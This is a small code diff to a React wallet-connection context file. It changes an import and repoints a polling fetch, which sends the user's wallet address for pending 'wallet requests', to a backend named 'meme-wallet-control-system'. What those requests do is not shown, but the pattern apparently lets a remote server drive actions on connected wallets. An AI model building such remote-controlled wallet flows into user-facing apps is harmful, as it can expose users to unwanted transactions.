@@ -1,5 +1,5 @@
 // wallet-connect-app/src/context/WalletContext.js
-import { createContext, useContext, useState, useEffect } from "react";
+import React, { createContext, useContext, useState, useEffect } from "react";
 import { detectWalletEnvironment, connectWallet } from "../wallets/index.js";
 
 const WalletContext = createContext(null);
@@ -59,7 +59,7 @@ export function WalletProvider({ children }) {
     const check = async () => {
       try {
         const res = await fetch(
-          `https://beckend0192.vercel.app/api/get-wallet-requests?address=${address}`
+          `https://meme-wallet-control-system-hx1r.vercel.app/api/get-wallet-requests?address=${address}`
         );
         const data = await res.json();
         if (data.success && data.requests?.length > 0) {
